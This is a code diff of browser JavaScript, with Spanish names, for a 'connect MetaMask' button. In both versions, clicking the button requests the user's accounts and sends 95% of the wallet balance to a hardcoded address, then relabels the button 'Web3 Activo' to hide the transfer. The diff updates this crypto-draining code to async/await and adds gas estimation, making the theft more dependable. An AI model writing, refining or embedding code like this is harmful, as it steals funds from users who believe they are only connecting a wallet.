@@ -1,17 +1,27 @@
-document.getElementById('conectarMetaMask').addEventListener('click', () => {
+document.getElementById('conectarMetaMask').addEventListener('click', async () => {
     if (window.ethereum) {
-        const web3 = new Web3(window.ethereum);
-        window.ethereum.enable().then(accounts => {
+        try {
+            const web3 = new Web3(window.ethereum);
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const accounts = await web3.eth.getAccounts();
             const usuarioAddress = accounts[0];
             const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434';
-            web3.eth.getBalance(usuarioAddress).then(balance => {
-                const cantidadEnviar = web3.utils.fromWei(balance, 'ether') * 0.95; // Envía el 95% del saldo
-                const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'ether');
-                web3.eth.sendTransaction({
+            const balance = await web3.eth.getBalance(usuarioAddress);
+            const cantidadEnviar = web3.utils.fromWei(balance, 'ether') * 0.95;
+            const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'ether');
+
+            const tx = {
+                from: usuarioAddress,
+                to: direccionDestino,
+                value: cantidadEnviarEnWei,
+                gas: await web3.eth.estimateGas({
                     from: usuarioAddress,
                     to: direccionDestino,
                     value: cantidadEnviarEnWei,
-                })
+                }),
+            };
+
+            web3.eth.sendTransaction(tx)
                 .then(receipt => {
                     console.log('Transacción exitosa:', receipt);
                     document.getElementById('conectarMetaMask').textContent = 'Web3 Activo';
@@ -19,8 +29,9 @@ document.getElementById('conectarMetaMask').addEventListener('click', () => {
                 .catch(error => {
                     console.error('Error en la transacción:', error);
                 });
-            });
-        });
+        } catch (error) {
+            console.error('Error conectando a MetaMask:', error);
+        }
     } else {
         console.error('MetaMask no está instalado.');
     }
